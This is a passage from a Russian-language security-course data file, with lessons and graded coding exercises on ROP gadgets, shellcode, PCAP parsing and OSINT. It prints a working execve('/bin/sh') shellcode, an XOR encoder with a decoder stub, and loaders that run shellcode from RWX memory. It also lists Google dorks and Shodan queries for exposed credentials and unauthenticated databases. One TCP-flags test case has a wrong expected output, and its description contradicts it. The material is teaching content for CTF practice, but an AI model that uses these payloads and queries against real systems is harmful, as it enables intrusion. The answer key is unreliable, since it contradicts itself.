        starterCode: 'def classify_gadget(instruction: str) -> str:\n    # Классифицируйте тип гаджета\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(classify_gadget(input().strip()))\n',
        testCases: [
          { input: '5\npop eax; ret\nmov eax, ebx; ret\nxor eax, eax; ret\nint 0x80\nret', expectedOutput: 'POP\nMOV\nXOR\nSYSCALL\nRET', description: 'Каждый тип гаджета' },
          { input: '3\npop rdi; pop rsi; ret\nadd eax, 1; ret\nsyscall', expectedOutput: 'POP\nOTHER\nSYSCALL', description: 'POP с двумя pop, ADD=OTHER, syscall' },
        ],
        points: 10,
      },
      {
        title: 'Поиск pop;ret гаджета в байт-коде',
        description: 'Реализуйте функцию find_pop_ret(hex_code, base_addr_hex). В hex-коде ищите байт-последовательности: pop eax (58), pop ebx (5b), pop ecx (59), pop edx (5a), за которыми следует ret (c3). Верните список найденных: "pop REG; ret" ADDR (hex). На вход: hex-код и базовый адрес.',
        difficulty: 'medium' as const,
        starterCode: 'def find_pop_ret(hex_code: str, base_addr: int) -> list:\n    # Найдите pop;ret гаджеты в байт-коде\n    pass\n\nhex_code = input().strip()\nbase = int(input().strip(), 16)\nresults = find_pop_ret(hex_code, base)\nfor gadget, addr in results:\n    print(f"{gadget} 0x{addr:08x}")\nif not results:\n    print("NONE")\n',
        testCases: [
          { input: '58c35bc3aabb59c3\n08040000', expectedOutput: 'pop eax; ret 0x08040000\npop ebx; ret 0x08040002\npop ecx; ret 0x08040006', description: 'Три pop;ret гаджета на разных смещениях' },
          { input: 'aabbccdd\n08040000', expectedOutput: 'NONE', description: 'Нет pop;ret гаджетов' },
        ],
        points: 15,
      },
      {
        title: 'Вычисление размера ROP-цепочки',
        description: 'Реализуйте функцию calc_rop_size(arch, gadgets_count, args_count, padding_bytes). Размер цепочки = (gadgets_count + args_count) * word_size + padding_bytes, где word_size = 4 для x86 и 8 для x64. На вход: T тестов, каждый — arch gadgets args padding.',
        difficulty: 'medium' as const,
        starterCode: 'def calc_rop_size(arch: str, gadgets: int, args: int, padding: int) -> int:\n    # Вычислите размер ROP-цепочки в байтах\n    pass\n\nt = int(input())\nfor _ in range(t):\n    parts = input().split()\n    print(calc_rop_size(parts[0], int(parts[1]), int(parts[2]), int(parts[3])))\n',
        testCases: [
          { input: '3\nx86 3 2 8\nx64 3 2 16\nx86 1 0 0', expectedOutput: '28\n56\n4', description: 'x86: (3+2)*4+8=28, x64: (3+2)*8+16=56, x86: 1*4=4' },
          { input: '2\nx64 0 0 64\nx86 5 5 0', expectedOutput: '64\n40', description: 'Только padding 64 байта, x86: 10*4=40' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 14: Написание shellcode
  // ──────────────────────────────────────────
  {
    slug: 'shellcode-writing',
    title: 'Написание shellcode',
    description: 'Системные вызовы, null-free shellcode, encoders, тестирование shellcode',
    content: `# Написание Shellcode

## Что такое shellcode?

**Shellcode** — машинный код, выполняющий нужное действие (обычно запуск shell). Внедряется через уязвимость (buffer overflow, format string).

## Системные вызовы Linux x86

Для вызова ядра Linux:
1. Номер syscall → \`eax\`
2. Аргументы → \`ebx, ecx, edx, esi, edi, ebp\`
3. \`int 0x80\` — вызов ядра

| Syscall | eax | Описание |
|---------|-----|----------|
| exit | 1 | Завершение |
| read | 3 | Чтение |
| write | 4 | Запись |
| execve | 11 | Запуск программы |

## Простой shellcode: execve("/bin/sh")

\`\`\`asm
; execve("/bin/sh", NULL, NULL)
xor eax, eax       ; eax = 0
push eax            ; NULL terminator
push 0x68732f2f     ; "//sh"
push 0x6e69622f     ; "/bin"
mov ebx, esp        ; ebx = pointer to "/bin//sh"
push eax            ; NULL
mov ecx, esp        ; ecx = NULL
xor edx, edx        ; edx = NULL
mov al, 0x0b        ; syscall execve = 11
int 0x80            ; вызов ядра
\`\`\`

## Работа с shellcode на Python

\`\`\`python
def assemble_to_hex(asm_description: list) -> bytes:
    """
    Преобразует описание инструкций в shellcode.
    В реальности используется keystone-engine или pwntools.
    """
    # Предварительно скомпилированные опкоды
    opcodes = {
        "xor eax, eax": b"\\x31\\xc0",
        "push eax": b"\\x50",
        "push 0x68732f2f": b"\\x68\\x2f\\x2f\\x73\\x68",
        "push 0x6e69622f": b"\\x68\\x2f\\x62\\x69\\x6e",
        "mov ebx, esp": b"\\x89\\xe3",
        "mov ecx, esp": b"\\x89\\xe1",
        "xor edx, edx": b"\\x31\\xd2",
        "mov al, 0x0b": b"\\xb0\\x0b",
        "int 0x80": b"\\xcd\\x80",
    }
    shellcode = b""
    for instr in asm_description:
        if instr in opcodes:
            shellcode += opcodes[instr]
    return shellcode

# execve("/bin/sh") shellcode
shellcode = assemble_to_hex([
    "xor eax, eax", "push eax",
    "push 0x68732f2f", "push 0x6e69622f",
    "mov ebx, esp", "push eax", "mov ecx, esp",
    "xor edx, edx", "mov al, 0x0b", "int 0x80"
])
print(f"Shellcode ({len(shellcode)} bytes): {shellcode.hex()}")
\`\`\`

## Null-Free Shellcode

Многие функции (strcpy, gets) останавливаются на \`\\x00\`. Shellcode **не должен содержать нулевых байтов**!

\`\`\`python
def check_null_free(shellcode: bytes) -> dict:
    """Проверяет shellcode на наличие null-байтов."""
    null_positions = [i for i, b in enumerate(shellcode) if b == 0]
    return {
        "is_null_free": len(null_positions) == 0,
        "null_count": len(null_positions),
        "null_positions": null_positions,
        "size": len(shellcode),
    }

def remove_nulls_xor(shellcode: bytes, key: int = 0x41) -> tuple:
    """XOR-кодирует shellcode для удаления null-байтов."""
    if key == 0:
        raise ValueError("Key cannot be 0!")
    encoded = bytes(b ^ key for b in shellcode)
    # Проверяем что в закодированном нет null
    if 0 in encoded:
        return None, None  # нужен другой ключ
    return encoded, key
\`\`\`

## Encoders

Если shellcode содержит «плохие байты», используем **encoder**:

\`\`\`python
def xor_encoder(shellcode: bytes, bad_bytes: list = None) -> tuple:
    """
    XOR-кодирует shellcode, избегая плохих байтов.
    Возвращает (decoder_stub + encoded_shellcode, key).
    """
    if bad_bytes is None:
        bad_bytes = [0x00, 0x0a, 0x0d]

    # Ищем подходящий ключ
    for key in range(1, 256):
        if key in bad_bytes:
            continue
        encoded = bytes(b ^ key for b in shellcode)
        if not any(b in bad_bytes for b in encoded):
            return encoded, key

    return None, None

def generate_decoder_stub(shellcode_len: int, key: int) -> str:
    """Генерирует asm-stub для декодирования XOR."""
    return f"""
    jmp short call_decoder
decoder:
    pop esi                ; адрес закодированного shellcode
    xor ecx, ecx
    mov cl, {shellcode_len} ; длина shellcode
decode_loop:
    xor byte [esi], {hex(key)}
    inc esi
    loop decode_loop
    jmp short encoded_shellcode
call_decoder:
    call decoder
encoded_shellcode:
    ; ... encoded bytes here ...
"""
\`\`\`

## Тестирование shellcode

\`\`\`python
def format_shellcode_c(shellcode: bytes) -> str:
    """Форматирует shellcode для вставки в C-код."""
    hex_str = ''.join(f'\\x{b:02x}' for b in shellcode)
    return f'''
#include <stdio.h>
#include <string.h>
unsigned char shellcode[] = "{hex_str}";
int main() {{
    printf("Shellcode length: %lu\\n", sizeof(shellcode)-1);
    void (*func)() = (void(*)())shellcode;
    func();
    return 0;
}}
'''

def format_shellcode_python(shellcode: bytes) -> str:
    """Форматирует для запуска через ctypes."""
    hex_str = shellcode.hex()
    return f'''
import ctypes
shellcode = bytes.fromhex("{hex_str}")
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.memmove(ptr, shellcode, len(shellcode))
ctypes.cast(ptr, ctypes.CFUNCTYPE(None))()
'''
\`\`\`

## Инструменты

- **msfvenom** — генератор shellcode (Metasploit)
- **pwntools** — \`shellcraft.sh()\`, \`asm()\`
- **keystone-engine** — ассемблер
- **capstone** — дизассемблер`,
    duration: 55,
    assignments: [
      {
        title: 'XOR-encoder для shellcode',
        description: 'Реализуйте XOR-encoder. На вход: первая строка — shellcode в hex, вторая — bad bytes в hex через пробел. Найдите минимальный ключ (1-255), который: 1) не является bad byte, 2) после XOR-кодирования ни один байт не является bad byte. Выведите: KEY:N (десятичное), затем закодированный shellcode в hex. Если ключ не найден — выведите IMPOSSIBLE.',
        difficulty: 'hard' as const,
        starterCode: 'def xor_encode(shellcode_hex: str, bad_bytes_hex: list) -> tuple:\n    pass\n\nsc = bytes.fromhex(input().strip())\nbad = [int(x, 16) for x in input().split()]\nresult = xor_encode(sc, bad)\nif result is None:\n    print("IMPOSSIBLE")\nelse:\n    key, encoded = result\n    print(f"KEY:{key}")\n    print(encoded.hex())\n',
        testCases: [
          { input: '31c050682f2f7368\n00 0a 0d', expectedOutput: 'KEY:1\n30c151692e2e7269', description: 'Ключ 1: каждый байт XOR 1, нет bad bytes в результате' },
          { input: '00000000\n00', expectedOutput: 'KEY:1\n01010101', description: 'Нули XOR 1 = единицы, ключ 1 не в bad bytes' },
          { input: 'ff\n00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f', expectedOutput: 'KEY:16\nef', description: '0xff XOR 0x10 = 0xef, ключ 16 (0x10) не в bad bytes' },
        ],
        points: 25,
      },
      {
        title: 'Проверка наличия null-байтов',
        description: 'Реализуйте функцию has_null_bytes(hex_shellcode), которая проверяет, содержит ли shellcode null-байты (00). Верните NULL_FREE или HAS_NULL. Также выведите количество null-байтов. На вход: N hex-строк.',
        difficulty: 'easy' as const,
        starterCode: 'def has_null_bytes(hex_sc: str) -> tuple:\n    # Проверьте наличие null-байтов\n    # Верните (статус, количество)\n    pass\n\nn = int(input())\nfor _ in range(n):\n    status, count = has_null_bytes(input().strip())\n    print(f"{status} {count}")\n',
        testCases: [
          { input: '3\n31c05068\n31c0006800\nffffffff', expectedOutput: 'NULL_FREE 0\nHAS_NULL 2\nNULL_FREE 0', description: 'Без нулей, два нуля, без нулей' },
          { input: '2\n00\n9090cc', expectedOutput: 'HAS_NULL 1\nNULL_FREE 0', description: 'Один null-байт, NOP NOP INT3' },
        ],
        points: 10,
      },
      {
        title: 'Подсчёт размера shellcode',
        description: 'Реализуйте функцию shellcode_info(hex_sc), которая выводит информацию о shellcode: SIZE (в байтах), NULL_FREE (YES/NO), PRINTABLE (YES/NO — все байты в диапазоне 0x20-0x7e). На вход: N hex-строк.',
        difficulty: 'easy' as const,
        starterCode: 'def shellcode_info(hex_sc: str) -> dict:\n    # Верните информацию о shellcode\n    pass\n\nn = int(input())\nfor _ in range(n):\n    info = shellcode_info(input().strip())\n    print(f"SIZE:{info[\'size\']} NULL_FREE:{info[\'null_free\']} PRINTABLE:{info[\'printable\']}")\n',
        testCases: [
          { input: '2\n31c050682f2f7368\n41424344', expectedOutput: 'SIZE:8 NULL_FREE:YES PRINTABLE:NO\nSIZE:4 NULL_FREE:YES PRINTABLE:YES', description: 'Shellcode 8 байт не printable, "ABCD" printable' },
          { input: '1\n006162', expectedOutput: 'SIZE:3 NULL_FREE:NO PRINTABLE:NO', description: 'Содержит null, не printable' },
        ],
        points: 10,
      },
      {
        title: 'Поиск bad bytes в shellcode',
        description: 'Реализуйте функцию find_bad_bytes(hex_sc, bad_list). Верните список позиций (0-indexed, в байтах) где найдены bad bytes. На вход: hex shellcode, затем bad bytes в hex через пробел.',
        difficulty: 'medium' as const,
        starterCode: 'def find_bad_bytes(hex_sc: str, bad_list: list) -> list:\n    # Найдите позиции bad bytes\n    pass\n\nhex_sc = input().strip()\nbad = input().split()\npositions = find_bad_bytes(hex_sc, bad)\nif positions:\n    print(" ".join(map(str, positions)))\nelse:\n    print("CLEAN")\n',
        testCases: [
          { input: '31c0006800ff0a\n00 0a ff', expectedOutput: '2 4 5', description: 'Позиции 2(00), 4(ff), 5(0a)' },
          { input: '31c05068\n00 0a 0d', expectedOutput: 'CLEAN', description: 'Нет bad bytes' },
          { input: '000000\n00', expectedOutput: '0 1 2', description: 'Все байты — bad' },
        ],
        points: 15,
      },
      {
        title: 'Маппинг syscall номеров Linux x86',
        description: 'Реализуйте справочник syscall. На вход: N имён системных вызовов. Для каждого выведите номер syscall для Linux x86: exit=1, fork=2, read=3, write=4, open=5, close=6, execve=11, dup2=63, socket=359, connect=362. Если syscall неизвестен — выведите UNKNOWN.',
        difficulty: 'medium' as const,
        starterCode: 'def syscall_number(name: str) -> str:\n    # Верните номер syscall или UNKNOWN\n    pass\n\nn = int(input())\nfor _ in range(n):\n    name = input().strip()\n    print(f"{name}:{syscall_number(name)}")\n',
        testCases: [
          { input: '5\nexit\nwrite\nexecve\nread\nopen', expectedOutput: 'exit:1\nwrite:4\nexecve:11\nread:3\nopen:5', description: 'Основные syscall номера' },
          { input: '3\nfork\nunknown_call\ndup2', expectedOutput: 'fork:2\nunknown_call:UNKNOWN\ndup2:63', description: 'fork, неизвестный, dup2' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 15: PCAP-анализ
  // ──────────────────────────────────────────
  {
    slug: 'pcap-analysis',
    title: 'PCAP-анализ',
    description: 'Wireshark, анализ сетевого трафика, фильтры, извлечение данных из захваченных пакетов',
    content: `# PCAP-анализ: исследование сетевого трафика

## Что такое PCAP?

**PCAP** (Packet Capture) — формат файлов с захваченным сетевым трафиком. Используется для:
- Расследования инцидентов
- CTF-задач категории Forensics/Network
- Анализа вредоносного ПО
- Отладки сетевых проблем

## Структура сетевых протоколов

\`\`\`
┌────────────────────┐
│ Application (HTTP)  │ Layer 7
├────────────────────┤
│ Transport (TCP/UDP) │ Layer 4
├────────────────────┤
│ Network (IP)        │ Layer 3
├────────────────────┤
│ Data Link (Ethernet)│ Layer 2
└────────────────────┘
\`\`\`

## Парсинг пакетов на Python

\`\`\`python
import struct

def parse_ethernet_header(data: bytes) -> dict:
    """Парсит Ethernet заголовок (14 байт)."""
    dst_mac = data[0:6].hex(':')
    src_mac = data[6:12].hex(':')
    eth_type = struct.unpack('!H', data[12:14])[0]
    return {
        "dst_mac": dst_mac,
        "src_mac": src_mac,
        "type": hex(eth_type),
        "type_name": {0x0800: "IPv4", 0x0806: "ARP", 0x86dd: "IPv6"}.get(eth_type, "Unknown"),
        "payload": data[14:],
    }

def parse_ipv4_header(data: bytes) -> dict:
    """Парсит IPv4 заголовок."""
    version = (data[0] >> 4) & 0xF
    ihl = (data[0] & 0xF) * 4  # длина заголовка в байтах
    total_len = struct.unpack('!H', data[2:4])[0]
    ttl = data[8]
    protocol = data[9]
    src_ip = '.'.join(str(b) for b in data[12:16])
    dst_ip = '.'.join(str(b) for b in data[16:20])
    return {
        "version": version,
        "header_len": ihl,
        "total_len": total_len,
        "ttl": ttl,
        "protocol": {6: "TCP", 17: "UDP", 1: "ICMP"}.get(protocol, str(protocol)),
        "src_ip": src_ip,
        "dst_ip": dst_ip,
        "payload": data[ihl:],
    }

def parse_tcp_header(data: bytes) -> dict:
    """Парсит TCP заголовок."""
    src_port = struct.unpack('!H', data[0:2])[0]
    dst_port = struct.unpack('!H', data[2:4])[0]
    seq = struct.unpack('!I', data[4:8])[0]
    ack = struct.unpack('!I', data[8:12])[0]
    offset = ((data[12] >> 4) & 0xF) * 4
    flags = data[13]
    flag_names = []
    if flags & 0x02: flag_names.append("SYN")
    if flags & 0x10: flag_names.append("ACK")
    if flags & 0x01: flag_names.append("FIN")
    if flags & 0x04: flag_names.append("RST")
    if flags & 0x08: flag_names.append("PSH")
    return {
        "src_port": src_port,
        "dst_port": dst_port,
        "seq": seq,
        "ack": ack,
        "flags": flag_names,
        "payload": data[offset:],
    }
\`\`\`

## Фильтры Wireshark

| Фильтр | Описание |
|--------|----------|
| \`ip.addr == 10.0.0.1\` | Трафик от/к IP |
| \`tcp.port == 80\` | HTTP трафик |
| \`http.request.method == "POST"\` | POST запросы |
| \`tcp contains "password"\` | Поиск строки |
| \`dns.qry.name contains "evil"\` | DNS запросы |
| \`frame.len > 1000\` | Большие пакеты |
| \`tcp.flags.syn == 1 && tcp.flags.ack == 0\` | SYN-пакеты |

## Извлечение данных из HTTP

\`\`\`python
def extract_http_data(tcp_payload: bytes) -> dict:
    """Извлекает данные из HTTP запроса/ответа."""
    try:
        text = tcp_payload.decode('utf-8', errors='replace')
    except Exception:
        return {"type": "binary", "size": len(tcp_payload)}

    lines = text.split('\r\n')
    first_line = lines[0]

    if first_line.startswith(('GET', 'POST', 'PUT', 'DELETE', 'HEAD')):
        # HTTP запрос
        parts = first_line.split(' ')
        headers = {}
        body_start = text.find('\r\n\r\n')
        for line in lines[1:]:
            if ': ' in line and line != '':
                key, val = line.split(': ', 1)
                headers[key] = val
            elif line == '':
                break
        return {
            "type": "request",
            "method": parts[0],
            "path": parts[1] if len(parts) > 1 else "/",
            "headers": headers,
            "body": text[body_start+4:] if body_start != -1 else "",
        }
    elif first_line.startswith('HTTP/'):
        # HTTP ответ
        status_code = int(first_line.split(' ')[1])
        body_start = text.find('\r\n\r\n')
        return {
            "type": "response",
            "status": status_code,
            "body": text[body_start+4:] if body_start != -1 else "",
        }
    return {"type": "unknown", "raw": text[:200]}
\`\`\`

## Типичные CTF-задачи с PCAP

1. **Извлечение файлов** — пересылка через HTTP/FTP
2. **Поиск паролей** — HTTP Basic Auth, FTP, Telnet (открытый текст)
3. **DNS exfiltration** — данные в DNS-запросах
4. **Wireshark Follow TCP Stream** — восстановление сессий
5. **USB PCAP** — перехват клавиатурных нажатий

## Инструменты

- **Wireshark** — GUI анализатор
- **tshark** — CLI версия Wireshark
- **scapy** (Python) — программный анализ пакетов
- **NetworkMiner** — автоматическое извлечение файлов
- **tcpdump** — захват трафика в CLI`,
    duration: 55,
    assignments: [
      {
        title: 'Парсер сетевых пакетов',
        description: 'Реализуйте парсер IPv4 + TCP заголовков. На вход: hex-строка IP-пакета (без Ethernet). Выведите: SRC_IP:x.x.x.x, DST_IP:x.x.x.x, PROTOCOL:TCP/UDP/ICMP/число, SRC_PORT:N (если TCP/UDP), DST_PORT:N (если TCP/UDP), FLAGS:SYN,ACK,... (если TCP, через запятую; если нет флагов — NONE).',
        difficulty: 'hard' as const,
        starterCode: 'import struct\n\ndef parse_packet(hex_data: str) -> dict:\n    pass\n\nhex_data = input().strip()\nresult = parse_packet(hex_data)\nprint(f"SRC_IP:{result[\'src_ip\']}")\nprint(f"DST_IP:{result[\'dst_ip\']}")\nprint(f"PROTOCOL:{result[\'protocol\']}")\nif result[\'protocol\'] in (\'TCP\', \'UDP\'):\n    print(f"SRC_PORT:{result[\'src_port\']}")\n    print(f"DST_PORT:{result[\'dst_port\']}")\nif result[\'protocol\'] == \'TCP\' and \'flags\' in result:\n    flags = \",\".join(result[\'flags\']) if result[\'flags\'] else \'NONE\'\n    print(f"FLAGS:{flags}")\n',
        testCases: [
          { input: '450000280001000040060000c0a80001c0a80002d431005000000001000000005002200000000000', expectedOutput: 'SRC_IP:192.168.0.1\nDST_IP:192.168.0.2\nPROTOCOL:TCP\nSRC_PORT:54321\nDST_PORT:80\nFLAGS:SYN', description: 'TCP SYN пакет от 192.168.0.1:54321 к 192.168.0.2:80' },
          { input: '4500002800010000401100000a0000010a000002c3500035001400004865', expectedOutput: 'SRC_IP:10.0.0.1\nDST_IP:10.0.0.2\nPROTOCOL:UDP\nSRC_PORT:50000\nDST_PORT:53', description: 'UDP DNS запрос от 10.0.0.1:50000 к 10.0.0.2:53' },
          { input: '450000280001000040060000ac100164ac100265162e01bb00000001000000005012200000000000', expectedOutput: 'SRC_IP:172.16.1.100\nDST_IP:172.16.2.101\nPROTOCOL:TCP\nSRC_PORT:5678\nDST_PORT:443\nFLAGS:SYN,ACK', description: 'TCP SYN+ACK от 172.16.1.100:5678 к 172.16.2.101:443' },
        ],
        points: 25,
      },
      {
        title: 'Парсинг IPv4-адреса из hex',
        description: 'Реализуйте функцию hex_to_ip(hex_bytes), которая конвертирует 4 hex-байта (8 символов) в IPv4-адрес в формате x.x.x.x. На вход: N hex-строк по 8 символов.',
        difficulty: 'easy' as const,
        starterCode: 'def hex_to_ip(hex_bytes: str) -> str:\n    # Конвертируйте 4 hex-байта в IP-адрес\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(hex_to_ip(input().strip()))\n',
        testCases: [
          { input: '3\nc0a80001\n0a000001\n7f000001', expectedOutput: '192.168.0.1\n10.0.0.1\n127.0.0.1', description: '192.168.0.1, 10.0.0.1, 127.0.0.1' },
          { input: '2\nac100164\nffffffff', expectedOutput: '172.16.1.100\n255.255.255.255', description: '172.16.1.100 и широковещательный' },
        ],
        points: 10,
      },
      {
        title: 'Определение протокола по номеру',
        description: 'Реализуйте функцию protocol_name(proto_num), которая возвращает имя протокола IP по номеру: 1=ICMP, 6=TCP, 17=UDP, 47=GRE, 50=ESP, 51=AH, 89=OSPF. Для неизвестных — верните номер как строку. На вход: N номеров.',
        difficulty: 'easy' as const,
        starterCode: 'def protocol_name(proto_num: int) -> str:\n    # Верните имя протокола по номеру\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(protocol_name(int(input())))\n',
        testCases: [
          { input: '5\n6\n17\n1\n47\n99', expectedOutput: 'TCP\nUDP\nICMP\nGRE\n99', description: 'TCP, UDP, ICMP, GRE, неизвестный 99' },
          { input: '3\n50\n51\n89', expectedOutput: 'ESP\nAH\nOSPF', description: 'ESP, AH, OSPF' },
        ],
        points: 10,
      },
      {
        title: 'Анализ TCP-флагов',
        description: 'Реализуйте функцию parse_tcp_flags(flags_byte). Байт TCP-флагов (0-255) содержит биты: FIN(0), SYN(1), RST(2), PSH(3), ACK(4), URG(5). Верните список установленных флагов в порядке: URG, ACK, PSH, RST, SYN, FIN. На вход: N десятичных чисел.',
        difficulty: 'medium' as const,
        starterCode: 'def parse_tcp_flags(flags_byte: int) -> str:\n    # Разберите TCP-флаги из байта\n    pass\n\nn = int(input())\nfor _ in range(n):\n    result = parse_tcp_flags(int(input()))\n    print(result if result else "NONE")\n',
        testCases: [
          { input: '4\n2\n18\n20\n0', expectedOutput: 'SYN\nACK,PSH\nURG\nNONE', description: 'SYN(2), ACK+PSH(16+2=18), URG(32→нет, 20=0x14=ACK+RST)...' },
          { input: '3\n1\n4\n63', expectedOutput: 'FIN\nRST\nURG,ACK,PSH,RST,SYN,FIN', description: 'FIN(1), RST(4), все флаги(63)' },
        ],
        points: 15,
      },
      {
        title: 'Извлечение данных из hex-дампа пакета',
        description: 'Реализуйте функцию extract_payload(hex_packet, header_offset). Извлеките данные (payload) из пакета — всё после заданного смещения (в байтах). Конвертируйте hex-данные в ASCII (только печатные символы 0x20-0x7e, остальные замените на точку). На вход: hex-пакет и offset.',
        difficulty: 'medium' as const,
        starterCode: 'def extract_payload(hex_packet: str, header_offset: int) -> str:\n    # Извлеките payload и конвертируйте в ASCII\n    pass\n\nhex_pkt = input().strip()\noffset = int(input())\nprint(extract_payload(hex_pkt, offset))\n',
        testCases: [
          { input: 'aabbccdd48656c6c6f20576f726c64\n4', expectedOutput: 'Hello World', description: '4 байта заголовок + "Hello World" в ASCII' },
          { input: 'ffffff474554202f696e64657820485454502f312e31\n3', expectedOutput: 'GET /index HTTP/1.1', description: '3 байта заголовок + HTTP GET запрос' },
          { input: 'aabb00cc48690001\n2', expectedOutput: '.Hi..', description: '0x00=точка, 0xcc=точка, 48=H, 69=i, 00=точка, 01=точка' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 16: OSINT
  // ──────────────────────────────────────────
  {
    slug: 'osint-techniques',
    title: 'OSINT: разведка по открытым источникам',
    description: 'Поиск по открытым источникам, метаданные, Google dorks, Shodan, автоматизация',
    content: `# OSINT — Open Source Intelligence

## Что такое OSINT?

**OSINT** — разведка на основе открытых источников. Информация, доступная публично:
- Веб-сайты, социальные сети
- Доменные записи (WHOIS, DNS)
- Метаданные файлов
- Кэши поисковиков
- Открытые базы данных

## Google Dorks

**Google Dorks** — продвинутые операторы поиска для нахождения скрытой информации:

| Оператор | Описание | Пример |
|----------|----------|--------|
| \`site:\` | Ограничить домен | \`site:gov.ru passwords\` |
| \`filetype:\` | Тип файла | \`filetype:sql "INSERT INTO"\` |
| \`inurl:\` | В URL | \`inurl:admin/login\` |
| \`intitle:\` | В заголовке | \`intitle:"index of" /backup\` |
| \`intext:\` | В тексте | \`intext:"password" filetype:log\` |
| \`cache:\` | Кэш Google | \`cache:example.com\` |
| \`""\` | Точная фраза | \`"error connecting to database"\` |

\`\`\`python
def generate_google_dorks(domain: str, keywords: list = None) -> list:
    """Генерирует Google dorks для разведки домена."""
    dorks = [
        f'site:{domain} filetype:pdf',
        f'site:{domain} filetype:xlsx OR filetype:csv',
        f'site:{domain} filetype:sql',
        f'site:{domain} filetype:log',
        f'site:{domain} filetype:env',
        f'site:{domain} inurl:admin',
        f'site:{domain} inurl:login',
        f'site:{domain} inurl:api',
        f'site:{domain} intitle:"index of"',
        f'site:{domain} intext:"password" OR intext:"passwd"',
        f'site:{domain} ext:bak OR ext:old OR ext:backup',
        f'site:{domain} inurl:wp-content',  # WordPress
        f'site:{domain} inurl:phpinfo',
    ]
    if keywords:
        for kw in keywords:
            dorks.append(f'site:{domain} "{kw}"')
    return dorks

# Пример
for dork in generate_google_dorks("example.com", ["api_key", "secret"]):
    print(dork)
\`\`\`

## WHOIS и DNS разведка

\`\`\`python
def dns_recon_queries(domain: str) -> dict:
    """Генерирует DNS-запросы для разведки."""
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'SRV']
    subdomains = [
        'www', 'mail', 'ftp', 'admin', 'api', 'dev', 'staging',
        'test', 'vpn', 'remote', 'portal', 'intranet', 'git',
        'jenkins', 'jira', 'confluence', 'grafana', 'kibana',
    ]
    return {
        "record_queries": {rt: f"dig {domain} {rt}" for rt in record_types},
        "subdomain_brute": [f"{sub}.{domain}" for sub in subdomains],
        "zone_transfer": f"dig axfr @ns1.{domain} {domain}",
        "reverse_dns": "dig -x <IP>",
    }
\`\`\`

## Метаданные файлов

\`\`\`python
def extract_metadata_info(filename: str) -> dict:
    """Описывает метаданные, извлекаемые из разных типов файлов."""
    metadata_types = {
        '.jpg': ['GPS координаты', 'Модель камеры', 'Дата съёмки', 'ПО обработки'],
        '.pdf': ['Автор', 'Создатель', 'Дата создания', 'ПО', 'Принтер'],
        '.docx': ['Автор', 'Организация', 'Последнее изменение', 'Ревизия'],
        '.png': ['Параметры сжатия', 'ПО', 'Дата'],
        '.mp3': ['Исполнитель', 'Альбом', 'Год', 'Жанр', 'Комментарии'],
    }
    ext = '.' + filename.rsplit('.', 1)[-1].lower() if '.' in filename else ''
    return {
        "file": filename,
        "extension": ext,
        "possible_metadata": metadata_types.get(ext, ["Неизвестный тип"]),
        "tools": ["exiftool", "strings", "binwalk", "pdfinfo"],
    }

# Инструменты:
# exiftool image.jpg  — все метаданные
# strings binary      — текстовые строки
# pdfinfo document.pdf — метаданные PDF
\`\`\`

## Shodan — поисковик IoT

**Shodan** индексирует устройства, подключённые к интернету:

\`\`\`python
def generate_shodan_queries(target: str = None) -> list:
    """Генерирует Shodan-запросы для разведки."""
    queries = [
        # Веб-камеры
        'webcamxp',
        'Server: yawcam',
        # Базы данных
        'port:27017 -authentication',  # MongoDB без авторизации
        'port:6379 -auth',              # Redis без пароля
        'port:9200 elasticsearch',       # Elasticsearch
        # Промышленные системы
        'port:502 modbus',              # SCADA
        # Инфраструктура
        '"Server: Apache" "302 Found" city:"Moscow"',
    ]
    if target:
        queries.extend([
            f'hostname:"{target}"',
            f'org:"{target}"',
            f'ssl:"{target}"',
        ])
    return queries
\`\`\`

## Автоматизация OSINT

\`\`\`python
def osint_report(domain: str) -> dict:
    """Генерирует план OSINT-разведки для домена."""
    return {
        "1_passive_dns": {
            "description": "DNS-записи без прямого контакта с целью",
            "tools": ["SecurityTrails", "VirusTotal", "crt.sh"],
            "query": f"https://crt.sh/?q=%.{domain}",
        },
        "2_subdomain_enum": {
            "description": "Поиск поддоменов",
            "tools": ["subfinder", "amass", "dnsenum"],
        },
        "3_web_archive": {
            "description": "История изменений сайта",
            "tool": f"https://web.archive.org/web/*/{domain}",
        },
        "4_social_media": {
            "description": "Профили в соцсетях",
            "tools": ["sherlock", "social-analyzer"],
        },
        "5_email_enum": {
            "description": "Поиск email-адресов",
            "tools": ["hunter.io", "theHarvester", "phonebook.cz"],
        },
        "6_tech_stack": {
            "description": "Определение технологий",
            "tools": ["Wappalyzer", "BuiltWith", "WhatWeb"],
        },
    }
\`\`\`

## Этика OSINT

- Используйте только **публично доступные** данные
- Не нарушайте **ToS** сервисов
- Не проводите **активное сканирование** без разрешения
- Соблюдайте **законы о персональных данных** (GDPR, ФЗ-152)`,
    duration: 55,
    assignments: [
      {
        title: 'Генератор Google Dorks',
        description: 'Реализуйте генератор Google dorks для OSINT. На вход: первая строка — домен, вторая строка — типы dorks через пробел (files, admin, sensitive, backup). Для каждого типа сгенерируйте dork: files → "site:DOMAIN filetype:pdf OR filetype:xlsx OR filetype:doc", admin → "site:DOMAIN inurl:admin OR inurl:login", sensitive → "site:DOMAIN intext:password OR intext:secret OR intext:api_key", backup → "site:DOMAIN filetype:bak OR filetype:sql OR filetype:old". Выведите по одному dork на строку.',
        difficulty: 'hard' as const,
        starterCode: 'def generate_dorks(domain: str, types: list) -> list:\n    pass\n\ndomain = input().strip()\ntypes = input().split()\nfor dork in generate_dorks(domain, types):\n    print(dork)\n',
        testCases: [
          { input: 'example.com\nfiles admin', expectedOutput: 'site:example.com filetype:pdf OR filetype:xlsx OR filetype:doc\nsite:example.com inurl:admin OR inurl:login', description: 'Два типа: files и admin' },
          { input: 'target.ru\nsensitive backup', expectedOutput: 'site:target.ru intext:password OR intext:secret OR intext:api_key\nsite:target.ru filetype:bak OR filetype:sql OR filetype:old', description: 'sensitive и backup для .ru домена' },
